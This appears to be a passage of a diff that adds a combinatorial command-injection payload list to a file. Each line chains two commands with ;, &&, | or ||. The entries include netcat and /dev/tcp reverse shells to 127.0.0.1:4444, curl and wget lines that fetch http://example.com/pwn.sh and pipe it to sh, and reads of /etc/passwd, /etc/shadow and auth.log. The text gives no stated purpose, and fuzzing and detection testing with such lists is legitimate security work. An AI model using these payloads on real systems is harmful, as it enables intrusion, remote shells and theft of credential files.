+nc 127.0.0.1 4444 -e /bin/bash && /usr/bin/printf 'pwned\n'
+nc 127.0.0.1 4444 -e /bin/bash | /usr/bin/printf 'pwned\n'
+nc 127.0.0.1 4444 -e /bin/bash || /usr/bin/printf 'pwned\n'
+nc 127.0.0.1 4444 -e /bin/bash ; chmod +x /tmp/pwned
+nc 127.0.0.1 4444 -e /bin/bash && chmod +x /tmp/pwned
+nc 127.0.0.1 4444 -e /bin/bash | chmod +x /tmp/pwned
+nc 127.0.0.1 4444 -e /bin/bash || chmod +x /tmp/pwned
+nc 127.0.0.1 4444 -e /bin/bash ; tar -cf /tmp/dump.tar /etc
+nc 127.0.0.1 4444 -e /bin/bash && tar -cf /tmp/dump.tar /etc
+nc 127.0.0.1 4444 -e /bin/bash | tar -cf /tmp/dump.tar /etc
+nc 127.0.0.1 4444 -e /bin/bash || tar -cf /tmp/dump.tar /etc
+nc 127.0.0.1 4444 -e /bin/bash ; openssl s_client -connect example.com:443
+nc 127.0.0.1 4444 -e /bin/bash && openssl s_client -connect example.com:443
+nc 127.0.0.1 4444 -e /bin/bash | openssl s_client -connect example.com:443
+nc 127.0.0.1 4444 -e /bin/bash || openssl s_client -connect example.com:443
+nc 127.0.0.1 4444 -e /bin/bash ; ssh localhost id
+nc 127.0.0.1 4444 -e /bin/bash && ssh localhost id
+nc 127.0.0.1 4444 -e /bin/bash | ssh localhost id
+nc 127.0.0.1 4444 -e /bin/bash || ssh localhost id
+nc 127.0.0.1 4444 -e /bin/bash ; ftp http://example.com/pwn.sh
+nc 127.0.0.1 4444 -e /bin/bash && ftp http://example.com/pwn.sh
+nc 127.0.0.1 4444 -e /bin/bash | ftp http://example.com/pwn.sh
+nc 127.0.0.1 4444 -e /bin/bash || ftp http://example.com/pwn.sh
+python -c 'import os;print(os.listdir("/"))' ; id
+python -c 'import os;print(os.listdir("/"))' && id
+python -c 'import os;print(os.listdir("/"))' | id
+python -c 'import os;print(os.listdir("/"))' || id
+python -c 'import os;print(os.listdir("/"))' ; uname -a
+python -c 'import os;print(os.listdir("/"))' && uname -a
+python -c 'import os;print(os.listdir("/"))' | uname -a
+python -c 'import os;print(os.listdir("/"))' || uname -a
+python -c 'import os;print(os.listdir("/"))' ; whoami
+python -c 'import os;print(os.listdir("/"))' && whoami
+python -c 'import os;print(os.listdir("/"))' | whoami
+python -c 'import os;print(os.listdir("/"))' || whoami
+python -c 'import os;print(os.listdir("/"))' ; ls -la /
+python -c 'import os;print(os.listdir("/"))' && ls -la /
+python -c 'import os;print(os.listdir("/"))' | ls -la /
+python -c 'import os;print(os.listdir("/"))' || ls -la /
+python -c 'import os;print(os.listdir("/"))' ; ls -la /etc
+python -c 'import os;print(os.listdir("/"))' && ls -la /etc
+python -c 'import os;print(os.listdir("/"))' | ls -la /etc
+python -c 'import os;print(os.listdir("/"))' || ls -la /etc
+python -c 'import os;print(os.listdir("/"))' ; ls -lha /root
+python -c 'import os;print(os.listdir("/"))' && ls -lha /root
+python -c 'import os;print(os.listdir("/"))' | ls -lha /root
+python -c 'import os;print(os.listdir("/"))' || ls -lha /root
+python -c 'import os;print(os.listdir("/"))' ; cat /etc/passwd
+python -c 'import os;print(os.listdir("/"))' && cat /etc/passwd
+python -c 'import os;print(os.listdir("/"))' | cat /etc/passwd
+python -c 'import os;print(os.listdir("/"))' || cat /etc/passwd
+python -c 'import os;print(os.listdir("/"))' ; cat /etc/shadow
+python -c 'import os;print(os.listdir("/"))' && cat /etc/shadow
+python -c 'import os;print(os.listdir("/"))' | cat /etc/shadow
+python -c 'import os;print(os.listdir("/"))' || cat /etc/shadow
+python -c 'import os;print(os.listdir("/"))' ; cat /etc/hosts
+python -c 'import os;print(os.listdir("/"))' && cat /etc/hosts
+python -c 'import os;print(os.listdir("/"))' | cat /etc/hosts
+python -c 'import os;print(os.listdir("/"))' || cat /etc/hosts
+python -c 'import os;print(os.listdir("/"))' ; cat /var/log/auth.log
+python -c 'import os;print(os.listdir("/"))' && cat /var/log/auth.log
+python -c 'import os;print(os.listdir("/"))' | cat /var/log/auth.log
+python -c 'import os;print(os.listdir("/"))' || cat /var/log/auth.log
+python -c 'import os;print(os.listdir("/"))' ; env
+python -c 'import os;print(os.listdir("/"))' && env
+python -c 'import os;print(os.listdir("/"))' | env
+python -c 'import os;print(os.listdir("/"))' || env
+python -c 'import os;print(os.listdir("/"))' ; ps aux
+python -c 'import os;print(os.listdir("/"))' && ps aux
+python -c 'import os;print(os.listdir("/"))' | ps aux
+python -c 'import os;print(os.listdir("/"))' || ps aux
+python -c 'import os;print(os.listdir("/"))' ; netstat -tulnp
+python -c 'import os;print(os.listdir("/"))' && netstat -tulnp
+python -c 'import os;print(os.listdir("/"))' | netstat -tulnp
+python -c 'import os;print(os.listdir("/"))' || netstat -tulnp
+python -c 'import os;print(os.listdir("/"))' ; mtr -r 127.0.0.1 -c 1
+python -c 'import os;print(os.listdir("/"))' && mtr -r 127.0.0.1 -c 1
+python -c 'import os;print(os.listdir("/"))' | mtr -r 127.0.0.1 -c 1
+python -c 'import os;print(os.listdir("/"))' || mtr -r 127.0.0.1 -c 1
+python -c 'import os;print(os.listdir("/"))' ; curl http://example.com/pwn.sh | sh
+python -c 'import os;print(os.listdir("/"))' && curl http://example.com/pwn.sh | sh
+python -c 'import os;print(os.listdir("/"))' | curl http://example.com/pwn.sh | sh
+python -c 'import os;print(os.listdir("/"))' || curl http://example.com/pwn.sh | sh
+python -c 'import os;print(os.listdir("/"))' ; wget http://example.com/pwn.sh -O- | sh
+python -c 'import os;print(os.listdir("/"))' && wget http://example.com/pwn.sh -O- | sh
+python -c 'import os;print(os.listdir("/"))' | wget http://example.com/pwn.sh -O- | sh
+python -c 'import os;print(os.listdir("/"))' || wget http://example.com/pwn.sh -O- | sh
+python -c 'import os;print(os.listdir("/"))' ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+python -c 'import os;print(os.listdir("/"))' && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+python -c 'import os;print(os.listdir("/"))' | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+python -c 'import os;print(os.listdir("/"))' || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+python -c 'import os;print(os.listdir("/"))' ; nc 127.0.0.1 4444 -e /bin/bash
+python -c 'import os;print(os.listdir("/"))' && nc 127.0.0.1 4444 -e /bin/bash
+python -c 'import os;print(os.listdir("/"))' | nc 127.0.0.1 4444 -e /bin/bash
+python -c 'import os;print(os.listdir("/"))' || nc 127.0.0.1 4444 -e /bin/bash
+python -c 'import os;print(os.listdir("/"))' ; python -c 'import os;print(os.listdir("/"))'
+python -c 'import os;print(os.listdir("/"))' && python -c 'import os;print(os.listdir("/"))'
+python -c 'import os;print(os.listdir("/"))' | python -c 'import os;print(os.listdir("/"))'
+python -c 'import os;print(os.listdir("/"))' || python -c 'import os;print(os.listdir("/"))'
+python -c 'import os;print(os.listdir("/"))' ; perl -e 'print "pwned"'
+python -c 'import os;print(os.listdir("/"))' && perl -e 'print "pwned"'
+python -c 'import os;print(os.listdir("/"))' | perl -e 'print "pwned"'
+python -c 'import os;print(os.listdir("/"))' || perl -e 'print "pwned"'
+python -c 'import os;print(os.listdir("/"))' ; php -r 'system("id");'
+python -c 'import os;print(os.listdir("/"))' && php -r 'system("id");'
+python -c 'import os;print(os.listdir("/"))' | php -r 'system("id");'
+python -c 'import os;print(os.listdir("/"))' || php -r 'system("id");'
+python -c 'import os;print(os.listdir("/"))' ; ruby -e 'puts `id`'
+python -c 'import os;print(os.listdir("/"))' && ruby -e 'puts `id`'
+python -c 'import os;print(os.listdir("/"))' | ruby -e 'puts `id`'
+python -c 'import os;print(os.listdir("/"))' || ruby -e 'puts `id`'
+python -c 'import os;print(os.listdir("/"))' ; /bin/bash -c 'id'
+python -c 'import os;print(os.listdir("/"))' && /bin/bash -c 'id'
+python -c 'import os;print(os.listdir("/"))' | /bin/bash -c 'id'
+python -c 'import os;print(os.listdir("/"))' || /bin/bash -c 'id'
+python -c 'import os;print(os.listdir("/"))' ; /usr/bin/id >/tmp/id.txt
+python -c 'import os;print(os.listdir("/"))' && /usr/bin/id >/tmp/id.txt
+python -c 'import os;print(os.listdir("/"))' | /usr/bin/id >/tmp/id.txt
+python -c 'import os;print(os.listdir("/"))' || /usr/bin/id >/tmp/id.txt
+python -c 'import os;print(os.listdir("/"))' ; /bin/echo pwned > /tmp/pwned.txt
+python -c 'import os;print(os.listdir("/"))' && /bin/echo pwned > /tmp/pwned.txt
+python -c 'import os;print(os.listdir("/"))' | /bin/echo pwned > /tmp/pwned.txt
+python -c 'import os;print(os.listdir("/"))' || /bin/echo pwned > /tmp/pwned.txt
+python -c 'import os;print(os.listdir("/"))' ; /usr/bin/printf 'pwned\n'
+python -c 'import os;print(os.listdir("/"))' && /usr/bin/printf 'pwned\n'
+python -c 'import os;print(os.listdir("/"))' | /usr/bin/printf 'pwned\n'
+python -c 'import os;print(os.listdir("/"))' || /usr/bin/printf 'pwned\n'
+python -c 'import os;print(os.listdir("/"))' ; chmod +x /tmp/pwned
+python -c 'import os;print(os.listdir("/"))' && chmod +x /tmp/pwned
+python -c 'import os;print(os.listdir("/"))' | chmod +x /tmp/pwned
+python -c 'import os;print(os.listdir("/"))' || chmod +x /tmp/pwned
+python -c 'import os;print(os.listdir("/"))' ; tar -cf /tmp/dump.tar /etc
+python -c 'import os;print(os.listdir("/"))' && tar -cf /tmp/dump.tar /etc
+python -c 'import os;print(os.listdir("/"))' | tar -cf /tmp/dump.tar /etc
+python -c 'import os;print(os.listdir("/"))' || tar -cf /tmp/dump.tar /etc
+python -c 'import os;print(os.listdir("/"))' ; openssl s_client -connect example.com:443
+python -c 'import os;print(os.listdir("/"))' && openssl s_client -connect example.com:443
+python -c 'import os;print(os.listdir("/"))' | openssl s_client -connect example.com:443
+python -c 'import os;print(os.listdir("/"))' || openssl s_client -connect example.com:443
+python -c 'import os;print(os.listdir("/"))' ; ssh localhost id
+python -c 'import os;print(os.listdir("/"))' && ssh localhost id
+python -c 'import os;print(os.listdir("/"))' | ssh localhost id
+python -c 'import os;print(os.listdir("/"))' || ssh localhost id
+python -c 'import os;print(os.listdir("/"))' ; ftp http://example.com/pwn.sh
+python -c 'import os;print(os.listdir("/"))' && ftp http://example.com/pwn.sh
+python -c 'import os;print(os.listdir("/"))' | ftp http://example.com/pwn.sh
+python -c 'import os;print(os.listdir("/"))' || ftp http://example.com/pwn.sh
+perl -e 'print "pwned"' ; id
+perl -e 'print "pwned"' && id
+perl -e 'print "pwned"' | id
+perl -e 'print "pwned"' || id
+perl -e 'print "pwned"' ; uname -a
+perl -e 'print "pwned"' && uname -a
+perl -e 'print "pwned"' | uname -a
+perl -e 'print "pwned"' || uname -a
+perl -e 'print "pwned"' ; whoami
+perl -e 'print "pwned"' && whoami
+perl -e 'print "pwned"' | whoami
+perl -e 'print "pwned"' || whoami
+perl -e 'print "pwned"' ; ls -la /
+perl -e 'print "pwned"' && ls -la /
+perl -e 'print "pwned"' | ls -la /
+perl -e 'print "pwned"' || ls -la /
+perl -e 'print "pwned"' ; ls -la /etc
+perl -e 'print "pwned"' && ls -la /etc
+perl -e 'print "pwned"' | ls -la /etc
+perl -e 'print "pwned"' || ls -la /etc
+perl -e 'print "pwned"' ; ls -lha /root
+perl -e 'print "pwned"' && ls -lha /root
+perl -e 'print "pwned"' | ls -lha /root
+perl -e 'print "pwned"' || ls -lha /root
+perl -e 'print "pwned"' ; cat /etc/passwd
+perl -e 'print "pwned"' && cat /etc/passwd
+perl -e 'print "pwned"' | cat /etc/passwd
+perl -e 'print "pwned"' || cat /etc/passwd
+perl -e 'print "pwned"' ; cat /etc/shadow
+perl -e 'print "pwned"' && cat /etc/shadow
+perl -e 'print "pwned"' | cat /etc/shadow
+perl -e 'print "pwned"' || cat /etc/shadow
+perl -e 'print "pwned"' ; cat /etc/hosts
+perl -e 'print "pwned"' && cat /etc/hosts
+perl -e 'print "pwned"' | cat /etc/hosts
+perl -e 'print "pwned"' || cat /etc/hosts
+perl -e 'print "pwned"' ; cat /var/log/auth.log
+perl -e 'print "pwned"' && cat /var/log/auth.log
+perl -e 'print "pwned"' | cat /var/log/auth.log
+perl -e 'print "pwned"' || cat /var/log/auth.log
+perl -e 'print "pwned"' ; env
+perl -e 'print "pwned"' && env
+perl -e 'print "pwned"' | env
+perl -e 'print "pwned"' || env
+perl -e 'print "pwned"' ; ps aux
+perl -e 'print "pwned"' && ps aux
+perl -e 'print "pwned"' | ps aux
+perl -e 'print "pwned"' || ps aux
+perl -e 'print "pwned"' ; netstat -tulnp
+perl -e 'print "pwned"' && netstat -tulnp
+perl -e 'print "pwned"' | netstat -tulnp
+perl -e 'print "pwned"' || netstat -tulnp
+perl -e 'print "pwned"' ; mtr -r 127.0.0.1 -c 1
+perl -e 'print "pwned"' && mtr -r 127.0.0.1 -c 1
+perl -e 'print "pwned"' | mtr -r 127.0.0.1 -c 1
+perl -e 'print "pwned"' || mtr -r 127.0.0.1 -c 1
+perl -e 'print "pwned"' ; curl http://example.com/pwn.sh | sh
+perl -e 'print "pwned"' && curl http://example.com/pwn.sh | sh
+perl -e 'print "pwned"' | curl http://example.com/pwn.sh | sh
+perl -e 'print "pwned"' || curl http://example.com/pwn.sh | sh
+perl -e 'print "pwned"' ; wget http://example.com/pwn.sh -O- | sh
+perl -e 'print "pwned"' && wget http://example.com/pwn.sh -O- | sh
+perl -e 'print "pwned"' | wget http://example.com/pwn.sh -O- | sh
+perl -e 'print "pwned"' || wget http://example.com/pwn.sh -O- | sh
+perl -e 'print "pwned"' ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+perl -e 'print "pwned"' && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+perl -e 'print "pwned"' | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+perl -e 'print "pwned"' || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+perl -e 'print "pwned"' ; nc 127.0.0.1 4444 -e /bin/bash
+perl -e 'print "pwned"' && nc 127.0.0.1 4444 -e /bin/bash
+perl -e 'print "pwned"' | nc 127.0.0.1 4444 -e /bin/bash
+perl -e 'print "pwned"' || nc 127.0.0.1 4444 -e /bin/bash
+perl -e 'print "pwned"' ; python -c 'import os;print(os.listdir("/"))'
+perl -e 'print "pwned"' && python -c 'import os;print(os.listdir("/"))'
+perl -e 'print "pwned"' | python -c 'import os;print(os.listdir("/"))'
+perl -e 'print "pwned"' || python -c 'import os;print(os.listdir("/"))'
+perl -e 'print "pwned"' ; perl -e 'print "pwned"'
+perl -e 'print "pwned"' && perl -e 'print "pwned"'
+perl -e 'print "pwned"' | perl -e 'print "pwned"'
+perl -e 'print "pwned"' || perl -e 'print "pwned"'
+perl -e 'print "pwned"' ; php -r 'system("id");'
+perl -e 'print "pwned"' && php -r 'system("id");'
+perl -e 'print "pwned"' | php -r 'system("id");'
+perl -e 'print "pwned"' || php -r 'system("id");'
+perl -e 'print "pwned"' ; ruby -e 'puts `id`'
+perl -e 'print "pwned"' && ruby -e 'puts `id`'
+perl -e 'print "pwned"' | ruby -e 'puts `id`'
+perl -e 'print "pwned"' || ruby -e 'puts `id`'
+perl -e 'print "pwned"' ; /bin/bash -c 'id'
+perl -e 'print "pwned"' && /bin/bash -c 'id'
+perl -e 'print "pwned"' | /bin/bash -c 'id'
+perl -e 'print "pwned"' || /bin/bash -c 'id'
+perl -e 'print "pwned"' ; /usr/bin/id >/tmp/id.txt
+perl -e 'print "pwned"' && /usr/bin/id >/tmp/id.txt
+perl -e 'print "pwned"' | /usr/bin/id >/tmp/id.txt
+perl -e 'print "pwned"' || /usr/bin/id >/tmp/id.txt
+perl -e 'print "pwned"' ; /bin/echo pwned > /tmp/pwned.txt
+perl -e 'print "pwned"' && /bin/echo pwned > /tmp/pwned.txt
+perl -e 'print "pwned"' | /bin/echo pwned > /tmp/pwned.txt
+perl -e 'print "pwned"' || /bin/echo pwned > /tmp/pwned.txt
+perl -e 'print "pwned"' ; /usr/bin/printf 'pwned\n'
+perl -e 'print "pwned"' && /usr/bin/printf 'pwned\n'
+perl -e 'print "pwned"' | /usr/bin/printf 'pwned\n'
+perl -e 'print "pwned"' || /usr/bin/printf 'pwned\n'
+perl -e 'print "pwned"' ; chmod +x /tmp/pwned
+perl -e 'print "pwned"' && chmod +x /tmp/pwned
+perl -e 'print "pwned"' | chmod +x /tmp/pwned
+perl -e 'print "pwned"' || chmod +x /tmp/pwned
+perl -e 'print "pwned"' ; tar -cf /tmp/dump.tar /etc
+perl -e 'print "pwned"' && tar -cf /tmp/dump.tar /etc
+perl -e 'print "pwned"' | tar -cf /tmp/dump.tar /etc
+perl -e 'print "pwned"' || tar -cf /tmp/dump.tar /etc
+perl -e 'print "pwned"' ; openssl s_client -connect example.com:443
+perl -e 'print "pwned"' && openssl s_client -connect example.com:443
+perl -e 'print "pwned"' | openssl s_client -connect example.com:443
+perl -e 'print "pwned"' || openssl s_client -connect example.com:443
+perl -e 'print "pwned"' ; ssh localhost id
+perl -e 'print "pwned"' && ssh localhost id
+perl -e 'print "pwned"' | ssh localhost id
+perl -e 'print "pwned"' || ssh localhost id
+perl -e 'print "pwned"' ; ftp http://example.com/pwn.sh
+perl -e 'print "pwned"' && ftp http://example.com/pwn.sh
+perl -e 'print "pwned"' | ftp http://example.com/pwn.sh
+perl -e 'print "pwned"' || ftp http://example.com/pwn.sh
+php -r 'system("id");' ; id
+php -r 'system("id");' && id
+php -r 'system("id");' | id
+php -r 'system("id");' || id
+php -r 'system("id");' ; uname -a
+php -r 'system("id");' && uname -a
+php -r 'system("id");' | uname -a
+php -r 'system("id");' || uname -a
+php -r 'system("id");' ; whoami
+php -r 'system("id");' && whoami
+php -r 'system("id");' | whoami
+php -r 'system("id");' || whoami
+php -r 'system("id");' ; ls -la /
+php -r 'system("id");' && ls -la /
+php -r 'system("id");' | ls -la /
+php -r 'system("id");' || ls -la /
+php -r 'system("id");' ; ls -la /etc
+php -r 'system("id");' && ls -la /etc
+php -r 'system("id");' | ls -la /etc
+php -r 'system("id");' || ls -la /etc
+php -r 'system("id");' ; ls -lha /root
+php -r 'system("id");' && ls -lha /root
+php -r 'system("id");' | ls -lha /root
+php -r 'system("id");' || ls -lha /root
+php -r 'system("id");' ; cat /etc/passwd
+php -r 'system("id");' && cat /etc/passwd
+php -r 'system("id");' | cat /etc/passwd
+php -r 'system("id");' || cat /etc/passwd
+php -r 'system("id");' ; cat /etc/shadow
+php -r 'system("id");' && cat /etc/shadow
+php -r 'system("id");' | cat /etc/shadow
+php -r 'system("id");' || cat /etc/shadow
+php -r 'system("id");' ; cat /etc/hosts
+php -r 'system("id");' && cat /etc/hosts
+php -r 'system("id");' | cat /etc/hosts
+php -r 'system("id");' || cat /etc/hosts
+php -r 'system("id");' ; cat /var/log/auth.log
+php -r 'system("id");' && cat /var/log/auth.log
+php -r 'system("id");' | cat /var/log/auth.log
+php -r 'system("id");' || cat /var/log/auth.log
+php -r 'system("id");' ; env
+php -r 'system("id");' && env
+php -r 'system("id");' | env
+php -r 'system("id");' || env
+php -r 'system("id");' ; ps aux
+php -r 'system("id");' && ps aux
+php -r 'system("id");' | ps aux
+php -r 'system("id");' || ps aux
+php -r 'system("id");' ; netstat -tulnp
+php -r 'system("id");' && netstat -tulnp
+php -r 'system("id");' | netstat -tulnp
+php -r 'system("id");' || netstat -tulnp
+php -r 'system("id");' ; mtr -r 127.0.0.1 -c 1
+php -r 'system("id");' && mtr -r 127.0.0.1 -c 1
+php -r 'system("id");' | mtr -r 127.0.0.1 -c 1
+php -r 'system("id");' || mtr -r 127.0.0.1 -c 1
+php -r 'system("id");' ; curl http://example.com/pwn.sh | sh
+php -r 'system("id");' && curl http://example.com/pwn.sh | sh
+php -r 'system("id");' | curl http://example.com/pwn.sh | sh
+php -r 'system("id");' || curl http://example.com/pwn.sh | sh
+php -r 'system("id");' ; wget http://example.com/pwn.sh -O- | sh
+php -r 'system("id");' && wget http://example.com/pwn.sh -O- | sh
+php -r 'system("id");' | wget http://example.com/pwn.sh -O- | sh
+php -r 'system("id");' || wget http://example.com/pwn.sh -O- | sh
+php -r 'system("id");' ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+php -r 'system("id");' && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+php -r 'system("id");' | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+php -r 'system("id");' || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+php -r 'system("id");' ; nc 127.0.0.1 4444 -e /bin/bash
+php -r 'system("id");' && nc 127.0.0.1 4444 -e /bin/bash
+php -r 'system("id");' | nc 127.0.0.1 4444 -e /bin/bash
+php -r 'system("id");' || nc 127.0.0.1 4444 -e /bin/bash
+php -r 'system("id");' ; python -c 'import os;print(os.listdir("/"))'
+php -r 'system("id");' && python -c 'import os;print(os.listdir("/"))'
+php -r 'system("id");' | python -c 'import os;print(os.listdir("/"))'
+php -r 'system("id");' || python -c 'import os;print(os.listdir("/"))'
+php -r 'system("id");' ; perl -e 'print "pwned"'
+php -r 'system("id");' && perl -e 'print "pwned"'
+php -r 'system("id");' | perl -e 'print "pwned"'
+php -r 'system("id");' || perl -e 'print "pwned"'
+php -r 'system("id");' ; php -r 'system("id");'
+php -r 'system("id");' && php -r 'system("id");'
+php -r 'system("id");' | php -r 'system("id");'
+php -r 'system("id");' || php -r 'system("id");'
+php -r 'system("id");' ; ruby -e 'puts `id`'
+php -r 'system("id");' && ruby -e 'puts `id`'
+php -r 'system("id");' | ruby -e 'puts `id`'
+php -r 'system("id");' || ruby -e 'puts `id`'
+php -r 'system("id");' ; /bin/bash -c 'id'
+php -r 'system("id");' && /bin/bash -c 'id'
+php -r 'system("id");' | /bin/bash -c 'id'
+php -r 'system("id");' || /bin/bash -c 'id'
+php -r 'system("id");' ; /usr/bin/id >/tmp/id.txt
+php -r 'system("id");' && /usr/bin/id >/tmp/id.txt
+php -r 'system("id");' | /usr/bin/id >/tmp/id.txt
+php -r 'system("id");' || /usr/bin/id >/tmp/id.txt
+php -r 'system("id");' ; /bin/echo pwned > /tmp/pwned.txt
+php -r 'system("id");' && /bin/echo pwned > /tmp/pwned.txt
+php -r 'system("id");' | /bin/echo pwned > /tmp/pwned.txt
+php -r 'system("id");' || /bin/echo pwned > /tmp/pwned.txt
+php -r 'system("id");' ; /usr/bin/printf 'pwned\n'
+php -r 'system("id");' && /usr/bin/printf 'pwned\n'
+php -r 'system("id");' | /usr/bin/printf 'pwned\n'
+php -r 'system("id");' || /usr/bin/printf 'pwned\n'
+php -r 'system("id");' ; chmod +x /tmp/pwned
+php -r 'system("id");' && chmod +x /tmp/pwned
+php -r 'system("id");' | chmod +x /tmp/pwned
+php -r 'system("id");' || chmod +x /tmp/pwned
+php -r 'system("id");' ; tar -cf /tmp/dump.tar /etc
+php -r 'system("id");' && tar -cf /tmp/dump.tar /etc
+php -r 'system("id");' | tar -cf /tmp/dump.tar /etc
+php -r 'system("id");' || tar -cf /tmp/dump.tar /etc
+php -r 'system("id");' ; openssl s_client -connect example.com:443
+php -r 'system("id");' && openssl s_client -connect example.com:443
+php -r 'system("id");' | openssl s_client -connect example.com:443
+php -r 'system("id");' || openssl s_client -connect example.com:443
+php -r 'system("id");' ; ssh localhost id
+php -r 'system("id");' && ssh localhost id
+php -r 'system("id");' | ssh localhost id
+php -r 'system("id");' || ssh localhost id
+php -r 'system("id");' ; ftp http://example.com/pwn.sh
+php -r 'system("id");' && ftp http://example.com/pwn.sh
+php -r 'system("id");' | ftp http://example.com/pwn.sh
+php -r 'system("id");' || ftp http://example.com/pwn.sh
+ruby -e 'puts `id`' ; id
+ruby -e 'puts `id`' && id
+ruby -e 'puts `id`' | id
+ruby -e 'puts `id`' || id
+ruby -e 'puts `id`' ; uname -a
+ruby -e 'puts `id`' && uname -a
+ruby -e 'puts `id`' | uname -a
+ruby -e 'puts `id`' || uname -a
+ruby -e 'puts `id`' ; whoami
+ruby -e 'puts `id`' && whoami
+ruby -e 'puts `id`' | whoami
+ruby -e 'puts `id`' || whoami
+ruby -e 'puts `id`' ; ls -la /
+ruby -e 'puts `id`' && ls -la /
+ruby -e 'puts `id`' | ls -la /
+ruby -e 'puts `id`' || ls -la /
+ruby -e 'puts `id`' ; ls -la /etc
+ruby -e 'puts `id`' && ls -la /etc
+ruby -e 'puts `id`' | ls -la /etc
+ruby -e 'puts `id`' || ls -la /etc
+ruby -e 'puts `id`' ; ls -lha /root
+ruby -e 'puts `id`' && ls -lha /root
+ruby -e 'puts `id`' | ls -lha /root
+ruby -e 'puts `id`' || ls -lha /root
+ruby -e 'puts `id`' ; cat /etc/passwd
+ruby -e 'puts `id`' && cat /etc/passwd
+ruby -e 'puts `id`' | cat /etc/passwd
+ruby -e 'puts `id`' || cat /etc/passwd
+ruby -e 'puts `id`' ; cat /etc/shadow
+ruby -e 'puts `id`' && cat /etc/shadow
+ruby -e 'puts `id`' | cat /etc/shadow
+ruby -e 'puts `id`' || cat /etc/shadow
+ruby -e 'puts `id`' ; cat /etc/hosts
+ruby -e 'puts `id`' && cat /etc/hosts
+ruby -e 'puts `id`' | cat /etc/hosts
+ruby -e 'puts `id`' || cat /etc/hosts
+ruby -e 'puts `id`' ; cat /var/log/auth.log
+ruby -e 'puts `id`' && cat /var/log/auth.log
+ruby -e 'puts `id`' | cat /var/log/auth.log
+ruby -e 'puts `id`' || cat /var/log/auth.log
+ruby -e 'puts `id`' ; env
+ruby -e 'puts `id`' && env
+ruby -e 'puts `id`' | env
+ruby -e 'puts `id`' || env
+ruby -e 'puts `id`' ; ps aux
+ruby -e 'puts `id`' && ps aux
+ruby -e 'puts `id`' | ps aux
+ruby -e 'puts `id`' || ps aux
+ruby -e 'puts `id`' ; netstat -tulnp
+ruby -e 'puts `id`' && netstat -tulnp
+ruby -e 'puts `id`' | netstat -tulnp
+ruby -e 'puts `id`' || netstat -tulnp
+ruby -e 'puts `id`' ; mtr -r 127.0.0.1 -c 1
+ruby -e 'puts `id`' && mtr -r 127.0.0.1 -c 1
+ruby -e 'puts `id`' | mtr -r 127.0.0.1 -c 1
+ruby -e 'puts `id`' || mtr -r 127.0.0.1 -c 1
+ruby -e 'puts `id`' ; curl http://example.com/pwn.sh | sh
+ruby -e 'puts `id`' && curl http://example.com/pwn.sh | sh
+ruby -e 'puts `id`' | curl http://example.com/pwn.sh | sh
+ruby -e 'puts `id`' || curl http://example.com/pwn.sh | sh
+ruby -e 'puts `id`' ; wget http://example.com/pwn.sh -O- | sh
+ruby -e 'puts `id`' && wget http://example.com/pwn.sh -O- | sh
+ruby -e 'puts `id`' | wget http://example.com/pwn.sh -O- | sh
+ruby -e 'puts `id`' || wget http://example.com/pwn.sh -O- | sh
+ruby -e 'puts `id`' ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ruby -e 'puts `id`' && bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ruby -e 'puts `id`' | bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ruby -e 'puts `id`' || bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+ruby -e 'puts `id`' ; nc 127.0.0.1 4444 -e /bin/bash
+ruby -e 'puts `id`' && nc 127.0.0.1 4444 -e /bin/bash
+ruby -e 'puts `id`' | nc 127.0.0.1 4444 -e /bin/bash
+ruby -e 'puts `id`' || nc 127.0.0.1 4444 -e /bin/bash
+ruby -e 'puts `id`' ; python -c 'import os;print(os.listdir("/"))'
+ruby -e 'puts `id`' && python -c 'import os;print(os.listdir("/"))'
+ruby -e 'puts `id`' | python -c 'import os;print(os.listdir("/"))'
+ruby -e 'puts `id`' || python -c 'import os;print(os.listdir("/"))'
+ruby -e 'puts `id`' ; perl -e 'print "pwned"'
+ruby -e 'puts `id`' && perl -e 'print "pwned"'
+ruby -e 'puts `id`' | perl -e 'print "pwned"'
+ruby -e 'puts `id`' || perl -e 'print "pwned"'
+ruby -e 'puts `id`' ; php -r 'system("id");'
+ruby -e 'puts `id`' && php -r 'system("id");'
+ruby -e 'puts `id`' | php -r 'system("id");'
+ruby -e 'puts `id`' || php -r 'system("id");'
+ruby -e 'puts `id`' ; ruby -e 'puts `id`'
+ruby -e 'puts `id`' && ruby -e 'puts `id`'
+ruby -e 'puts `id`' | ruby -e 'puts `id`'
+ruby -e 'puts `id`' || ruby -e 'puts `id`'
+ruby -e 'puts `id`' ; /bin/bash -c 'id'
+ruby -e 'puts `id`' && /bin/bash -c 'id'
+ruby -e 'puts `id`' | /bin/bash -c 'id'
+ruby -e 'puts `id`' || /bin/bash -c 'id'
+ruby -e 'puts `id`' ; /usr/bin/id >/tmp/id.txt
+ruby -e 'puts `id`' && /usr/bin/id >/tmp/id.txt
+ruby -e 'puts `id`' | /usr/bin/id >/tmp/id.txt
+ruby -e 'puts `id`' || /usr/bin/id >/tmp/id.txt
+ruby -e 'puts `id`' ; /bin/echo pwned > /tmp/pwned.txt
+ruby -e 'puts `id`' && /bin/echo pwned > /tmp/pwned.txt
+ruby -e 'puts `id`' | /bin/echo pwned > /tmp/pwned.txt
+ruby -e 'puts `id`' || /bin/echo pwned > /tmp/pwned.txt
+ruby -e 'puts `id`' ; /usr/bin/printf 'pwned\n'
+ruby -e 'puts `id`' && /usr/bin/printf 'pwned\n'
+ruby -e 'puts `id`' | /usr/bin/printf 'pwned\n'
+ruby -e 'puts `id`' || /usr/bin/printf 'pwned\n'
+ruby -e 'puts `id`' ; chmod +x /tmp/pwned
+ruby -e 'puts `id`' && chmod +x /tmp/pwned
+ruby -e 'puts `id`' | chmod +x /tmp/pwned
+ruby -e 'puts `id`' || chmod +x /tmp/pwned
